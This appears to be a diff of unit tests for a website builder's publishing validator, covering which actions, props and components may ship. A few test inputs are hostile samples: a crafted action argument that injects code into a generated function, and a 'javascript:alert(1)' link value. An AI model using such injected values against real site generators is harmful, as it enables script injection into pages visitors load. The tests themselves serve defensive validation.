+    ).toEqual(["page-system"]);
+    expect(
+      colliding({
+        dataSources: [parameterOf("page-system", "page")],
+        pages: [...base.pages, { rootInstanceId: "page" }],
+      })
+    ).toEqual(["page-system"]);
+    expect(
+      colliding({
+        dataSources: [parameterOf("page-system", "page")],
+        instances: new Map([...base.instances, ["box", node("Box", "page")]]),
+      })
+    ).toEqual(["page-system"]);
+    expect(
+      colliding({
+        dataSources: [parameterOf("page-system", "page")],
+        pages: [
+          ...base.pages,
+          { rootInstanceId: "box", systemDataSourceId: "page-system" },
+        ],
+      })
+    ).toEqual(["page-system"]);
+    // a variable with a page's own id
+    expect(colliding({ dataSources: [variableOf("page-system")] })).toEqual([
+      "page-system",
+    ]);
+    // a page's or a page template's own on a root with the global root's id,
+    // which every page holds
+    expect(
+      colliding({
+        dataSources: [parameterOf("root-system", ROOT_INSTANCE_ID)],
+        pages: [
+          ...base.pages,
+          {
+            rootInstanceId: ROOT_INSTANCE_ID,
+            systemDataSourceId: "root-system",
+          },
+        ],
+        props: [parameterProp("box", "ref", "root-system")],
+      })
+    ).toEqual(["root-system"]);
+
+    // a Collection's item named outside it: elsewhere, on the Collection
+    // itself, or on an instance also held outside it
+    for (const holder of ["box", "list", "page"]) {
+      expect(
+        colliding({
+          dataSources: [item],
+          props: [bound, parameterProp(holder, "data-item", "item")],
+        }),
+        holder
+      ).toEqual(["item"]);
+    }
+    expect(
+      colliding({
+        dataSources: [item],
+        instances: new Map([
+          ...base.instances,
+          ["card", node("Box", "shared")],
+        ]),
+        props: [bound, parameterProp("shared", "data-item", "item")],
+      })
+    ).toEqual(["item"]);
+    // or below a cycle
+    expect(
+      colliding({
+        dataSources: [item],
+        instances: new Map([
+          ...base.instances,
+          ["card", node("Box", "loop")],
+          ["loop", node("Box", "card")],
+        ]),
+        props: [bound, parameterProp("loop", "data-item", "item")],
+      })
+    ).toEqual(["item"]);
+    // bound twice, by one Collection or by two
+    expect(
+      colliding({
+        dataSources: [item],
+        props: [bound, parameterProp("list", "itemKey", "item")],
+      })
+    ).toEqual(["item"]);
+    expect(
+      colliding({
+        dataSources: [item],
+        instances: new Map([
+          ...base.instances,
+          ["card", node(collectionComponent)],
+        ]),
+        props: [bound, parameterProp("card", "item", "item")],
+      })
+    ).toEqual(["item"]);
+    // two binding props of one name on one Collection, of any type: neither
+    // parameter is its binding
+    const secondProp = (
+      name: string,
+      value: string,
+      type: "parameter" | "expression" = "parameter"
+    ): [string, Prop] => {
+      const id = `list:${name}:second`;
+      return [id, { id, instanceId: "list", name, type, value } as Prop];
+    };
+    for (const name of ["item", "itemKey"]) {
+      expect(
+        colliding({
+          dataSources: [
+            parameterOf("first", "list"),
+            parameterOf("last", "list"),
+          ],
+          props: [
+            parameterProp("list", name, "first"),
+            secondProp(name, "last"),
+            parameterProp("card", "ref", "first"),
+          ],
+        }),
+        name
+      ).toEqual(["first", "last"]);
+    }
+    expect(
+      colliding({
+        dataSources: [item],
+        props: [bound, secondProp("item", "$ws$dataSource$item", "expression")],
+      })
+    ).toEqual(["item"]);
+    // held by another instance, or a page's own
+    expect(
+      colliding({ dataSources: [parameterOf("item", "page")], props: [bound] })
+    ).toEqual(["item"]);
+    expect(
+      colliding({
+        dataSources: [parameterOf("page-system", "page")],
+        props: [parameterProp("list", "item", "page-system")],
+      })
+    ).toEqual(["page-system"]);
+    // a variable or a Resource a Collection binds, and an action that names it
+    const variable = variableOf("v");
+    const bindsVariable = {
+      dataSources: [variable],
+      props: [parameterProp("list", "item", "v")],
+    };
+    expect(colliding(bindsVariable)).toEqual(["v"]);
+    expect(
+      colliding({
+        dataSources: [
+          [
+            "res",
+            {
+              type: "resource",
+              id: "res",
+              name: "res",
+              scopeInstanceId: "page",
+              resourceId: "resource",
+            },
+          ],
+        ],
+        props: [parameterProp("list", "itemKey", "res")],
+      })
+    ).toEqual(["res"]);
+    // bound by a Collection stored with the global root's id, which never
+    // ships
+    expect(
+      colliding({
+        dataSources: [parameterOf("root-item", ROOT_INSTANCE_ID)],
+        instances: new Map([
+          ...base.instances,
+          [ROOT_INSTANCE_ID, node(collectionComponent)],
+        ]),
+        pages: [...base.pages, { rootInstanceId: ROOT_INSTANCE_ID }],
+        props: [parameterProp(ROOT_INSTANCE_ID, "item", "root-item")],
+      })
+    ).toEqual(["root-item"]);
+    // a variable, or a page's own, held by the Collection that binds it
+    expect(
+      colliding({
+        dataSources: [variableOf("v", "list")],
+        props: [parameterProp("list", "item", "v")],
+      })
+    ).toEqual(["v"]);
+    expect(
+      colliding({
+        dataSources: [parameterOf("list-system", "list-root")],
+        instances: new Map([
+          ...base.instances,
+          ["list-root", node(collectionComponent)],
+        ]),
+        pages: [
+          ...base.pages,
+          { rootInstanceId: "list-root", systemDataSourceId: "list-system" },
+        ],
+        props: [parameterProp("list-root", "item", "list-system")],
+      })
+    ).toEqual(["list-system"]);
+    const context = actionContextOf({
+      ...base,
+      pageRootIds: new Set(["page"]),
+      dataSources: new Map(bindsVariable.dataSources),
+      props: new Map(bindsVariable.props),
+    });
+    expect(
+      actionMayRun(
+        {
+          ...actionProp([
+            { args: [], code: `${encodeDataSourceVariable("v")} = 1` },
+          ]),
+          instanceId: "card",
+        },
+        context
+      )
+    ).toBe(false);
+  });
+
+  // The context is computed again when the instances, the props, the
+  // Resources or the pages it was computed from change
+  test("judges a data source again when what decides it changes", () => {
+    const dataSources = new Map<DataSource["id"], DataSource>([
+      [
+        "v1",
+        {
+          type: "variable",
+          id: "v1",
+          name: "v",
+          scopeInstanceId: "body",
+          value: { type: "string", value: "" },
+        },
+      ],
+      [
+        "p1",
+        {
+          type: "parameter",
+          id: "p1",
+          name: "system",
+          scopeInstanceId: "body",
+        },
+      ],
+    ]);
+    const build = {
+      instances: new Map([["body", node("Body")]]),
+      pageRootIds: new Set(["body"]),
+      pages: [
+        { rootInstanceId: "body", systemDataSourceId: "p1" },
+      ] as PageNames[],
+      dataSources,
+      props: new Map<Prop["id"], Prop>(),
+      resources: new Map(),
+    };
+    const kept = (changes: Partial<typeof build>) => [
+      ...actionContextOf({ ...build, ...changes }).dataSources.keys(),
+    ];
+    expect(kept({})).toEqual(["v1", "p1"]);
+    expect(kept({ resources: new Map([["v1", {}]]) })).toEqual(["p1"]);
+    expect(kept({})).toEqual(["v1", "p1"]);
+    expect(
+      kept({
+        props: new Map<Prop["id"], Prop>([
+          [
+            "action",
+            {
+              id: "action",
+              instanceId: "body",
+              name: "action",
+              type: "resource",
+              value: "v1",
+            },
+          ],
+        ]),
+      })
+    ).toEqual(["p1"]);
+    expect(kept({})).toEqual(["v1", "p1"]);
+    expect(
+      kept({
+        instances: new Map([
+          ["body", node("Body", "v1")],
+          ["v1", node("Form")],
+        ]),
+      })
+    ).toEqual(["p1"]);
+    expect(kept({})).toEqual(["v1", "p1"]);
+    expect(kept({ pages: [{ rootInstanceId: "body" }] })).toEqual(["v1"]);
+  });
+
+  // A page template is edited on the canvas as a page is, but publishing
+  // reads the pages: an instance a page reaches is judged by the pages, and
+  // one only a template reaches by the templates
+  test("judges a holder a page reaches by the page roots, and one only a template reaches by the template roots", () => {
+    const tree: ActionContext = {
+      instances: new Map([
+        ["page", node("Body", "shared")],
+        ["template", node("Body", "wrapper", "only")],
+        ["wrapper", node("Box", "shared")],
+        ["shared", node(signupForm)],
+        ["only", node(signupForm)],
+      ]),
+      pageRootIds: new Set(["page"]),
+      templateRootIds: new Set(["template"]),
+      dataSources: new Map([
+        ["page-var", scoped("variable", "page")],
+        ["template-var", scoped("variable", "template")],
+        ["wrapper-var", scoped("variable", "wrapper")],
+      ]),
+    };
+    const on = (holder: string, id: string) =>
+      actionMayRun(
+        {
+          ...actionProp(
+            [{ args: [], code: `${encodeDataSourceVariable(id)} = 1` }],
+            "onStateChange"
+          ),
+          instanceId: holder,
+        },
+        tree
+      );
+    expect(on("shared", "page-var")).toBe(true);
+    expect(on("shared", "wrapper-var")).toBe(false);
+    expect(on("shared", "template-var")).toBe(false);
+    expect(on("only", "template-var")).toBe(true);
+    expect(on("only", "page-var")).toBe(false);
+    // and without template roots, only its own
+    expect(
+      actionMayRun(
+        {
+          ...actionProp(
+            [
+              {
+                args: [],
+                code: `${encodeDataSourceVariable("template-var")} = 1`,
+              },
+            ],
+            "onStateChange"
+          ),
+          instanceId: "only",
+        },
+        { ...tree, templateRootIds: undefined }
+      )
+    ).toBe(false);
+  });
+
+  test("refuses an action as a Collection's item or key", () => {
+    const tree: ActionContext = {
+      instances: new Map([
+        ["body", node("Body", "list", "box")],
+        ["list", node(collectionComponent)],
+        ["box", node("Box")],
+      ]),
+      pageRootIds: new Set(["body"]),
+      dataSources: new Map(),
+    };
+    const on = (instanceId: string, name: string) =>
+      actionMayRun({ ...actionProp([], name), instanceId }, tree);
+    expect(on("list", "item")).toBe(false);
+    expect(on("list", "itemKey")).toBe(false);
+    expect(on("list", "onClick")).toBe(true);
+    expect(on("box", "item")).toBe(true);
+  });
+
+  test("refuses, without throwing, a value that is not an action's shape", () => {
+    expect(
+      actionMayRun(
+        {
+          ...actionProp([]),
+          instanceId: "form",
+          value: [{ type: "execute", args: "event", code: "1" }],
+        } as never,
+        context
+      )
+    ).toBe(false);
+    expect(
+      actionMayRun(
+        {
+          ...actionProp([]),
+          instanceId: "form",
+          value: [{ type: "execute", args: [], code: 1 }],
+        } as never,
+        context
+      )
+    ).toBe(false);
+  });
+
+  test("accepts the actions the builder writes, and plain values", () => {
+    for (const value of [
+      // what the props panel adds, with nothing in it yet
+      [],
+      [{ args: [], code: `${variable} = 1` }],
+      [{ args: [], code: `${variable} = !${variable}` }],
+      [{ args: [], code: `${count} = ${count} + 1` }],
+      [{ args: ["state"], code: `${variable} = state` }],
+      [{ args: ["state"], code: `${variable} = state ? "open" : "closed"` }],
+      [{ args: ["state"], code: `${variable} = \`tab \${state}\`` }],
+      [{ args: ["a", "b"], code: `${variable} = a < b` }],
+      [{ args: ["a", "b"], code: `${variable} = a > b` }],
+      [{ args: [], code: `${variable} = { a: 1, b: [2] }` }],
+      [{ args: [], code: `${variable} = ${resource}` }],
+      [{ args: [], code: ` ${variable} = "/events/(all)" ` }],
+    ]) {
+      expect(mayRun(value), JSON.stringify(value)).toBe(true);
+    }
+  });
+
+  test("accepts every action the OrganizeOS blocks' templates write, as each is scoped", () => {
+    const actions = Object.entries(organizeosTemplates).flatMap(
+      ([name, meta]) => {
+        const fragment = renderTemplate(meta.template);
+        const fragmentContext = actionContextOf({
+          instances: new Map(
+            fragment.instances.map((instance) => [instance.id, instance])
+          ),
+          // the template's top instances, as a page holds them
+          pageRootIds: new Set(
+            fragment.children.flatMap((child) =>
+              child.type === "id" ? [child.value] : []
+            )
+          ),
+          dataSources: new Map(
+            fragment.dataSources.map((dataSource) => [
+              dataSource.id,
+              dataSource,
+            ])
+          ),
+          props: new Map(fragment.props.map((prop) => [prop.id, prop])),
+          resources: new Map(
+            fragment.resources.map((resource) => [resource.id, resource])
+          ),
+          pages: [],
+        });
+        return fragment.props.flatMap((prop) =>
+          prop.type === "action"
+            ? [{ name, prop, context: fragmentContext }]
+            : []
+        );
+      }
+    );
+    // Signup Form, RSVP Form and Rotating Tabs write one each
+    expect(actions.length).toBeGreaterThanOrEqual(3);
+    for (const { name, prop, context } of actions) {
+      expect(actionMayRun(prop, context), name).toBe(true);
+    }
+  });
+});
+
+describe("readsAsOneExpression", () => {
+  test("is true for one expression that reads the same way as a statement", () => {
+    for (const code of ["x = 1", " x = { a: 1 } ", 'x = "{}"']) {
+      expect(readsAsOneExpression(code), code).toBe(true);
+    }
+  });
+
+  test("is false where a statement reads the code otherwise, or more follows", () => {
+    for (const code of [
+      "{}",
+      "{ a: 1 }",
+      "function f() {}",
+      "class A {}",
+      "x = 1 /* x */",
+      "x = 1; y = 2",
+      "x = (",
+    ]) {
+      expect(readsAsOneExpression(code), code).toBe(false);
+    }
+  });
+});
+
+describe("holdsComment", () => {
+  test("is true for a comment of either kind anywhere, and for what it cannot read", () => {
+    for (const code of [
+      "a /* x */",
+      "/* x */ a",
+      "a = /**/ b",
+      "a // x",
+      "a = // x\n b",
+      "a <!-- x",
+      "a\n--> x",
+      '"',
+    ]) {
+      expect(holdsComment(code), JSON.stringify(code)).toBe(true);
+    }
+  });
+
+  test("is false for the same characters in a string or a template's text, and for division", () => {
+    for (const code of ['"/* x */"', "'// x'", "`/* ${a} */`", "a / b / c"]) {
+      expect(holdsComment(code), code).toBe(false);
+    }
+  });
+});
+
+describe("holdsAngleBrackets", () => {
+  test("is true for a < or << followed anywhere by a token that starts with >", () => {
+    for (const code of [
+      "a < b > c",
+      "a<b>c",
+      "a < b > (c)",
+      "a < b > `c`",
+      "a < b > /c/g",
+      "1 < 2 > /(x)/g",
+      "a < b >> /c/",
+      "a < b > [c]",
+      "a < b >\nc",
+      "a << b > c",
+      "a < b >= c",
+      "a < b >> c",
+      "a < b >>> c",
+      "a < b, a >>= c",
+      "a < b, a >>>= c",
+      "a < (b ? c : d) > e",
+      "[a < b, c > d]",
+      "`${a < b}` + (c > d)",
+    ]) {
+      expect(holdsAngleBrackets(code), JSON.stringify(code)).toBe(true);
+    }
+  });
+
+  test("is false for a < or a > alone, a > before any <, and either inside a string or a template's text", () => {
+    for (const code of [
+      "a < b",
+      "a > /c/",
+      "a > b < c",
+      "a >>= b < c",
+      "a <= b && b >= c",
+      "a <<= b",
+      '"<" + ">"',
+      "`<${a}>`",
+      "'a < b > (c)'",
+    ]) {
+      expect(holdsAngleBrackets(code), code).toBe(false);
+    }
+  });
+
+  test("is true for what it cannot read", () => {
+    expect(holdsAngleBrackets('"')).toBe(true);
+  });
+});
+
+describe("componentMayShip", () => {
+  const components = new Set(["Box", "@organizeos/site-components:SignupForm"]);
+
+  test("is true for a component the published page imports, and for one the generator writes itself", () => {
+    for (const component of [
+      "Box",
+      "@organizeos/site-components:SignupForm",
+      elementComponent,
+      collectionComponent,
+      blockComponent,
+      blockTemplateComponent,
+      descendantComponent,
+    ]) {
+      expect(componentMayShip(component, components), component).toBe(true);
+    }
+  });
+
+  test("is false for any other, the builder's global root included", () => {
+    for (const component of [
+      "x:script",
+      "script",
+      "Script",
+      "box",
+      "ws:root",
+      "@organizeos/site-components:Missing",
+      "",
+      1,
+      undefined,
+    ]) {
+      expect(componentMayShip(component, components), String(component)).toBe(
+        false
+      );
+    }
+  });
+});
+
+describe("instanceIdMayRun", () => {
+  test("is false for the global root's id, unless the switch is on", () => {
+    expect(instanceIdMayRun(ROOT_INSTANCE_ID)).toBe(false);
+    expect(instanceIdMayRun(ROOT_INSTANCE_ID, true)).toBe(true);
+    for (const id of ["root", "body", "x:root", ":root "]) {
+      expect(instanceIdMayRun(id), id).toBe(true);
+    }
+  });
+});
+
+describe("pageRootIdsOf and templateRootIdsOf", () => {
+  test("read the pages' roots and the page templates' roots apart", () => {
+    const page = (id: string, rootInstanceId: string) =>
+      ({ id, rootInstanceId }) as Page;
+    const pages = {
+      pages: new Map([
+        ["home", page("home", "home-root")],
+        ["about", page("about", "about-root")],
+      ]),
+      pageTemplates: new Map([["template", page("template", "template-root")]]),
+    } as unknown as Pages;
+    expect([...pageRootIdsOf(pages)]).toEqual(["home-root", "about-root"]);
+    expect([...templateRootIdsOf(pages)]).toEqual(["template-root"]);
+    expect([...pageRootIdsOf(undefined)]).toEqual([]);
+    expect([...templateRootIdsOf(undefined)]).toEqual([]);
+  });
+});
+
+describe("pagesAndTemplatesOf", () => {
+  test("reads each page's and page template's root and own data source, the same list for the same pages", () => {
+    const pages = {
+      pages: new Map([
+        [
+          "home",
+          { id: "home", rootInstanceId: "home-root", systemDataSourceId: "s1" },
+        ],
+        ["about", { id: "about", rootInstanceId: "about-root" }],
+      ]),
+      pageTemplates: new Map([
+        [
+          "template",
+          {
+            id: "template",
+            rootInstanceId: "template-root",
+            systemDataSourceId: "s2",
+          },
+        ],
+      ]),
+    } as unknown as Pages;
+    expect(pagesAndTemplatesOf(pages)).toEqual([
+      { rootInstanceId: "home-root", systemDataSourceId: "s1" },
+      { rootInstanceId: "about-root", systemDataSourceId: undefined },
+      { rootInstanceId: "template-root", systemDataSourceId: "s2" },
+    ]);
+    expect(pagesAndTemplatesOf(pages)).toBe(pagesAndTemplatesOf(pages));
+    expect(pagesAndTemplatesOf(undefined)).toEqual([]);
+  });
+});
+
+describe("isPlainData", () => {
+  test("is true for null, booleans, numbers, strings, and arrays and plain objects of them", () => {
+    for (const value of [
+      null,
+      true,
+      0,
+      -1.5,
+      NaN,
+      Infinity,
+      -Infinity,
+      [NaN],
+      "",
+      "state",
+      [],
+      [1, "a", [null]],
+      {},
+      { a: 1, b: [{ c: "d" }] },
+      Object.create(null),
+    ]) {
+      expect(isPlainData(value), JSON.stringify(value)).toBe(true);
+    }
+    // an object shared twice is still plain
+    const shared = { a: 1 };
+    expect(isPlainData([shared, shared])).toBe(true);
+  });
+
+  test("is false for anything else, wherever it is held", () => {
+    class Thing {}
+    const cyclic: Record<string, unknown> = {};
+    cyclic.self = cyclic;
+    const getter = Object.defineProperty({}, "x", { get: () => 1 });
+    for (const [index, value] of [
+      undefined,
+      1n,
+      Symbol("x"),
+      () => 1,
+      new Thing(),
+      new Date(0),
+      new Map(),
+      /x/,
+      globalThis,
+      { a: () => 1 },
+      [undefined],
+      { a: new Thing() },
+      Object.setPrototypeOf([1], {}),
+      Object.setPrototypeOf([], Object.create(null)),
+      cyclic,
+      getter,
+      { [Symbol("x")]: 1 },
+    ].entries()) {
+      expect(isPlainData(value), `value ${index}`).toBe(false);
+    }
+  });
+});
+
 describe("propMayShip", () => {
   const anywhere = [
     { component: "Link" },
@@ -918,7 +2606,128 @@ describe("propMayShip", () => {
     expect(propMayShip({ component: "Box" }, staticProp("id", "x"))).toBe(true);
   });
 
-  test("ships every prop of XML Node and XML Time", () => {
+  // The generator writes an action as code on any prop, of any component, on
+  // any page: the server renders it too, an XML page included
+  test("refuses an action that may not run, whatever its name and on any component, XML Node and XML Time included, and ships one that may", () => {
+    const crafted = actionProp([
+      { args: [") => 0, globalThis.pwned = 1, (x"], code: "0" },
+    ]).value;
+    // a variable set with no args, which any prop may do
+    const accepted = actionProp([
+      { args: [], code: `${encodeDataSourceVariable("v")} = 1` },
+    ]).value;
+    const context: ActionContext = {
+      instances: new Map(),
+      pageRootIds: new Set(),
+      dataSources: new Map([
+        [
+          "v",
+          { type: "variable", scopeInstanceId: ROOT_INSTANCE_ID, name: "v" },
+        ],
+      ]),
+    };
+    for (const instance of [
+      ...anywhere,
+      { component: collectionComponent },
+      { component: "XmlNode" },
+      { component: "XmlTime" },
+    ]) {
+      for (const name of [
+        "onClick",
+        "onStateChange",
+        "href",
+        "action",
+        "src",
+        "data",
+        "value",
+      ]) {
+        const prop = (value: ActionProp["value"]): ActionProp => ({
+          id: name,
+          instanceId: "i",
+          name,
+          type: "action",
+          value,
+        });
+        expect(
+          propMayShip(instance, prop(crafted)),
+          `${instance.component} ${name}`
+        ).toBe(false);
+        expect(
+          propMayShip(instance, prop(accepted), false, context),
+          `${instance.component} ${name}`
+        ).toBe(true);
+        expect(propMayShip(instance, prop(crafted), true)).toBe(true);
+      }
+    }
+  });
+
+  test("refuses an action that reads a member while paused, and ships it when org script may run", () => {
+    const prop: ActionProp = {
+      ...actionProp(
+        [
+          {
+            args: ["state"],
+            code: `${encodeDataSourceVariable("v")} = state.length`,
+          },
+        ],
+        "onStateChange"
+      ),
+      instanceId: "form",
+    };
+    const context: ActionContext = {
+      instances: new Map([
+        [
+          "form",
+          {
+            component: "@organizeos/site-components:SignupForm",
+            children: [],
+          },
+        ],
+      ]),
+      pageRootIds: new Set(["form"]),
+      dataSources: new Map([
+        ["v", { type: "variable", scopeInstanceId: "form", name: "v" }],
+      ]),
+    };
+    expect(propMayShip({ component: "Box" }, prop, false, context)).toBe(false);
+    expect(propMayShip({ component: "Box" }, prop, true, context)).toBe(true);
+  });
+
+  test("ships a Collection's item and key only as a parameter", () => {
+    const list = { component: collectionComponent };
+    const value = (type: Prop["type"], v: unknown, name = "item") =>
+      ({ id: "p", instanceId: "list", name, type, value: v }) as Prop;
+    for (const name of ["item", "itemKey"]) {
+      expect(
+        propMayShip(list, value("parameter", "item", name), false),
+        name
+      ).toBe(true);
+      for (const prop of [
+        value("expression", "$ws$dataSource$item", name),
+        value("string", "x", name),
+        value("json", [], name),
+        value("number", 1, name),
+      ]) {
+        expect(propMayShip(list, prop, false), `${name} ${prop.type}`).toBe(
+          false
+        );
+      }
+    }
+    // on any other component, and when the switch is on
+    expect(propMayShip({ component: "Box" }, value("string", "x"), false)).toBe(
+      true
+    );
+    expect(propMayShip(list, value("string", "x"), true)).toBe(true);
+  });
+
+  test("refuses an action that names a data source when it is given none", () => {
+    const prop = actionProp([
+      { args: [], code: `${encodeDataSourceVariable("v")} = 1` },
+    ]);
+    expect(propMayShip({ component: "Box" }, prop, false)).toBe(false);
+  });
+
+  test("ships every other prop of XML Node and XML Time", () => {
     for (const component of ["XmlNode", "XmlTime"]) {
       for (const prop of [
         staticProp("href", "javascript:alert(1)"),
